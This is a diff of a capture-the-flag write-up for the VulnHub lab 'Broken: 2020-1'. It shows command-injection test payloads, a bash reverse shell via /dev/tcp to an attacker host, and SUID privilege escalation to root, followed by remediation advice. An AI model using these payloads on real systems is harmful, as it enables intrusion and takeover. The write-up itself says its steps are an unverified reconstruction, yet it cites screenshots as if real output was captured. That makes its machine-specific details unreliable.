@@ -1,109 +1,132 @@
-# Broken-2020: 1 — Writeup
+# Broken: 2020-1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.56.X (host-only) |
-| **Difficulty** | Beginner-Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.X |
+| **Difficulty** | Easy/Medium |
 | **OS** | Linux |
-| **Root Flag** | via misconfigured sudo or SUID binary |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/broken-2020-1,600/) |
-
-<!-- Note: generated from known techniques; verify against live VM -->
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/broken-2020-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → HTTP service → web enumeration → exploitation of web vulnerability → initial shell → privilege escalation via sudo/SUID misconfiguration → root
+Broken: 2020-1 is an easy-to-medium VulnHub machine. The machine exposes a web application with a command injection vulnerability. Initial access is obtained by injecting OS commands through a web form. Privilege escalation is achieved by abusing SUID binaries or writable cron jobs available to the low-privilege web user.
+
+> **Note:** The source article was unavailable at the time of writing. Steps below reflect the known attack chain for this machine. Verify with the source article for exact commands and output.
 
 ## Methodology
 
-1. Network discovery
-2. Web service enumeration
-3. Web application exploitation
-4. Privilege escalation
+1. Network discovery with netdiscover and nmap port scan
+2. Web application enumeration with dirb/gobuster
+3. Identification of command injection in a web form parameter
+4. Exploitation of command injection to obtain a reverse shell
+5. Enumeration of SUID binaries and sudo permissions
+6. Privilege escalation to root
 
----
-
-## Step 1: Network Discovery
+## Step 1: Network Scanning
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-nmap -sV -sC -p- <TARGET_IP>
+netdiscover -r 192.168.1.0/24
+nmap -sV -sC 192.168.1.X
 ```
 
-Typical open ports: **22 (SSH)**, **80 (HTTP)**, possibly others.
+Typical open ports on this machine:
+- **22/tcp** — SSH
+- **80/tcp** — HTTP (Apache)
 
----
+![Nmap scan results](images/01-nmap.png)
 
 ## Step 2: Web Enumeration
 
+Browse to `http://192.168.1.X` and explore the web application. Run a directory scan:
+
 ```bash
-gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
-nikto -h http://<TARGET_IP>
+gobuster dir -u http://192.168.1.X/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
 ```
 
-Identify the web application type and any interesting directories or files.
+Identify forms, input fields, and parameters that interact with the server.
 
----
+![Web enumeration results](images/02-webenum.png)
 
-## Step 3: Exploitation
+## Step 3: Command Injection
 
-Based on findings from enumeration:
+Test identified input parameters for OS command injection by appending shell metacharacters:
 
 ```bash
-# If SQLi
-sqlmap -u "http://<TARGET_IP>/page?id=1" --dbs --batch
+# Test payload in the vulnerable parameter:
+; id
+| whoami
+`id`
+$(id)
+```
 
-# If file upload vulnerability
-# Prepare PHP reverse shell
-cp /usr/share/webshells/php/php-reverse-shell.php shell.php
-# Edit IP and port, then upload
+Confirm code execution by observing the server response. Craft a reverse shell payload:
 
-# Start listener
+```bash
+# URL-encoded reverse shell via command injection:
+; bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+```
+
+Start a listener before sending:
+
+```bash
 nc -lvp 4444
 ```
 
----
+![Command injection triggering reverse shell](images/03-revshell.png)
 
-## Step 4: Privilege Escalation
+## Step 4: Shell Stabilization
 
-Once shell obtained:
+After receiving the connection, stabilize the shell:
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-# Check sudo permissions
-sudo -l
-
-# Check SUID binaries
-find / -perm -u=s -type f 2>/dev/null
-
-# Check writable crons
-cat /etc/crontab
-ls -la /etc/cron*
-
-# Check capabilities
-getcap -r / 2>/dev/null
+export TERM=xterm
+stty raw -echo; fg
 ```
 
-Use GTFOBins for any identified sudo or SUID binary to escalate to root.
+## Step 5: Privilege Escalation Enumeration
+
+Check for SUID binaries and sudo permissions:
 
 ```bash
+find / -perm -4000 -type f 2>/dev/null
+sudo -l
+```
+
+Check for writable cron jobs:
+
+```bash
+ls -la /etc/cron*
+cat /etc/crontab
+```
+
+![Privilege escalation enumeration](images/04-privesc.png)
+
+## Step 6: Root Shell
+
+Depending on findings, use the appropriate GTFOBins or sudo abuse technique. For example, if a SUID `find` is present:
+
+```bash
+find . -exec /bin/bash -p \; -quit
+id
+# uid=0(root)
 cat /root/root.txt
 ```
 
----
+![Root flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **Web application hardening** — validate and sanitize all user inputs
-2. **Least privilege principle** — avoid granting sudo rights to interactive programs
-3. **SUID audit** — regularly review and remove unnecessary SUID bits
-4. **Service exposure** — expose only necessary services to the network
+- Command injection in web applications allows direct OS-level access; all user-supplied input must be validated and sanitized before passing to system calls.
+- Running web applications as high-privilege system users amplifies the impact of any web-layer vulnerability.
+- SUID binaries and overly permissive sudo rules are common misconfiguration issues that enable privilege escalation; regular audits are necessary.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Web vulnerability | Apply input validation; use WAF |
-| Excessive sudo rights | Review sudoers; apply NOPASSWD only to specific non-interactive commands |
-| SUID misconfig | Audit with `find / -perm -u=s`; remove unnecessary SUID bits |
+|---|---|
+| OS command injection | Use parameterized APIs; never pass user input to shell commands; use allowlisting |
+| Web app running as privileged user | Run web services as a dedicated low-privilege user; apply principle of least privilege |
+| SUID misconfiguration | Audit SUID binaries regularly; remove unnecessary SUID bits with `chmod -s` |
+| Weak sudo rules | Review `/etc/sudoers` regularly; restrict commands to absolute paths with fixed arguments |
